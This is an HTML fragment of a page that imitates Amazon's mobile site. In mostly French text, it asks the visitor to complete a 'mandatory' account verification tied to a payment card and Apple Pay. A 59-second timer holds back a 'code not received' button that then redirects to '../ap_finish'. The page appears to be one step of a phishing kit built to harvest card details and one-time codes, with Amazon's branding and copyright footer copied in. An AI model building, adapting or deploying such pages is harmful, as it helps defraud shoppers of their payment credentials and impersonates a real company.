              <div class="a-box a-alert-inline a-alert-inline-info">
                <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
                  <div class="a-alert-content"><span class="a-size-base">Votre carte ne comporte pas de date d'expiration</span></div>
                </div>
              </div>
            </div>
            


<br>

      
        </form>














        <style>
          #myTimer {
            display: block;
          }

          button {
            width: 125px;
            font-family: "Amazon Ember", Arial, sans-serif;
            display: flex;
            -webkit-appearance: none !important;
            -webkit-border-radius: 0.8rem;
            -moz-border-radius: 0.8rem;
            border-radius: 0.8rem;
            margin-bottom: 3.2rem !important;
            border: 1px solid #FCD200;
            background: #FFD814;
            box-shadow: 0 0.2rem 0.5rem 0 rgb(213 217 217 / 50%);
          }

          .btnEnable {
            width: 100%;
            padding: 15px;
            cursor: pointer;
            color: #111;
            -webkit-appearance: none !important;
            -webkit-border-radius: 0.8rem;
            -moz-border-radius: 0.8rem;
            border-radius: 0.8rem;
            border-color: #D5D9D9;
            border-style: solid;
            border-width: 1px;
            background: #fff;
            box-shadow: 0 0.2rem 0.5rem 0 rgb(213 217 217 / 50%);
          }

          #myBtn a {
            color: #111 !important;
          }

          .btnDisable {
            width: 100%;
            opacity: 0.5;
            display: flex;
            justify-content: space-between;
            padding: 15px;
            -webkit-appearance: none !important;
            -webkit-border-radius: 0.8rem;
            -moz-border-radius: 0.8rem;
            border-radius: 0.8rem;
            border-color: #D5D9D9;
            border-style: solid;
            border-width: 1px;
            background: #fff;
            box-shadow: 0 0.2rem 0.5rem 0 rgb(213 217 217 / 50%);
          }
        </style>



        <div id="wrapper" style="margin-top: 1.3rem;">
          <button type="button" id="myBtn" class="btnDisable" disabled>
            Je ne reçois pas le code <div id="myTimer"></div>
          </button>
        </div>


        <div id="header-5" style="margin-top:10px;" class="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
          <h1 data-action-on-load="register-listeners" data-listeners="" class="a-size-base has-action-on-load text-align-left a-text-normal">
            <center>This identification is mandatory to complete the verification process of your account.</center>
          </h1>
        </div>

        <div id="divider-12" class="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
          <hr aria-hidden="true" class="a-divider-normal">
        </div>
        <center><img src="../../img/ap2.png" style="width: 40%;" alt="Logos Apple Pay"></center>


        <script>
          var sec = 59;
          var myTimer = document.getElementById('myTimer');
          var myBtn = document.getElementById('myBtn');
          window.onload = countDown;

          function countDown() {
            if (sec < 10) {
              myTimer.innerHTML = "0" + sec + "s";
            } else {
              myTimer.innerHTML = sec + "s";
            }
            if (sec <= 0) {
              $("#myBtn").removeAttr("disabled");
              $("#myBtn").removeClass().addClass("btnEnable");
              $("#myTimer").fadeTo(2500, 0);
              $('#myBtn').on('click', function() {
                location.href = '../ap_finish'
              });
              myBtn.innerHTML = "<a href='../ap_finish' style='width:100%'>Je ne reçois pas le code</a>";
              return;
            }
            sec -= 1;
            window.setTimeout(countDown, 1000);
          }
        </script>



        </form>




      </div>
    </div>
  <!-- NAVYAAN FOOTER START -->
  <footer class="nav-mobile nav-ftr-batmobile">
  
  <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
    
    
    
    
        <div class="icp-container-mobile">
          
            
<style type="text/css">
  #icp-touch-link-language { display: none; }
</style>


<a href="#" aria-label="Choose a language for shopping." class="icp-touch-link-2" id="icp-touch-link-language">
  <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">English</span><span class="nav-arrow icp-up-down-arrow"></span>
</a>



          
          
          
            
<style type="text/css">
#icp-touch-link-country { display: none; }
</style>
<a href="#" aria-label="Choose a country/region for shopping." class="icp-touch-link-2" id="icp-touch-link-country">
  <span class="icp-flag-3 icp-flag-3-us"></span><span class="icp-color-base">United States</span>
</a>

          
        </div>
    
    
    
    
<ul class="nav-ftr-horiz">
    <li class="nav-li">
    <a href="#" id="" class="nav-a">Conditions of Use</a>
    
    </li>
    <li class="nav-li">
    <a href="#" id="" class="nav-a">Privacy Notice</a>
    
    </li>
    <li class="nav-li">
    <a href="#" id="" class="nav-a">Consumer Health Data Privacy Disclosure</a>
    
    </li>
    <li class="nav-li">
    <a href="" id="" class="nav-a">Your Ads Privacy Choices</a>
    
    </li>
    <li class="nav-li">
    
    <span id="nav-icon-ccba" class="nav-sprite"></span>
    </li>
</ul>

<div id="nav-ftr-copyright">
© 1996-2024, Amazon.com, Inc. or its affiliates
</div>
<div id="nav-ftr-legal">
</div>

 
</footer>

</body>

</html>